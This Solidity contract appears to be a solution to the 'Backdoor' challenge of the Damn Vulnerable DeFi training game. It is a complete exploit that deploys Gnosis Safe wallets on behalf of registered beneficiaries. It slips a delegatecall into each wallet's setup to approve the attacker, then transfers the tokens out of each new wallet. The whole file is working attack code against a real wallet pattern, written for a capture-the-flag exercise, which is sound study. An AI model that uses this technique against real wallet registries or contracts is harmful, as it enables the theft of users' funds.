// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafe} from "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "../DamnValuableToken.sol";

contract BackdoorAttacker {
    address private immutable masterCopy;
    address private immutable walletFactory;
    address private immutable registry;
    DamnValuableToken private immutable dvt;

    constructor(
        address _masterCopy,
        address _walletFactory,
        address _registry,
        address _token
    ) {
        masterCopy = _masterCopy;
        walletFactory = _walletFactory;
        dvt = DamnValuableToken(_token);
        registry = _registry;
    }

    function delegateApprove(address _spender) external {
        dvt.approve(_spender, 10 ether);
    }

    function attack(address[] memory _beneficiaries) external {
        for (uint256 i = 0; i < 4; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            // Create the data that will be passed to the proxyCreated function on WalletRegistry
            // The parameters correspond to the GnosisSafe::setup() contract
            bytes memory _initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector, // Selector for the setup() function call
                beneficiary, // _owners =>  List of Safe owners.
                1, // _threshold =>  Number of required confirmations for a Safe transaction.
                address(this), //  to => Contract address for optional delegate call.
                abi.encodeWithSignature("delegateApprove(address)", address(this)), // data =>  Data payload for optional delegate call.
                address(0), //  fallbackHandler =>  Handler for fallback calls to this contract
                0, //  paymentToken =>  Token that should be used for the payment (0 is ETH)
                0, // payment => Value that should be paid
                0 //  paymentReceiver => Adddress that should receive the payment (or 0 if tx.origin)
            );

            // Create new proxies on behalf of other users
            GnosisSafeProxy _newProxy = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(
                masterCopy, // _singleton => Address of singleton contract.
                _initializer, // initializer => Payload for message call sent to new proxy contract.
                i, // saltNonce => Nonce that will be used to generate the salt to calculate the address of the new proxy contract.
                IProxyCreationCallback(registry) //  callback => Function that will be called after the new proxy contract has been deployed and initialized.
            );

            dvt.transferFrom(address(_newProxy), msg.sender, 10 ether);
        }
    }
}
